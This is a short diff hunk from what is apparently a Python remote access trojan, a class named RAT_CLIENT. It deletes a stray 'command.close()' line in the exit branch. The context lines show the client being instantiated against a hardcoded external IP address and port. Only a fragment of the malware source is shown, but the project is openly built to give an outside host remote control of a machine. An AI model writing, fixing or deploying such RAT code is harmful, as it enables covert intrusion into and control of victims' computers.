@@ -88,7 +88,6 @@ class RAT_CLIENT:
             elif command == 'exitt':
                 s.send(b"exit")
                 s.close()
-                command.close()
                 break
 
 rat = RAT_CLIENT('138.68.79.95', 1431)
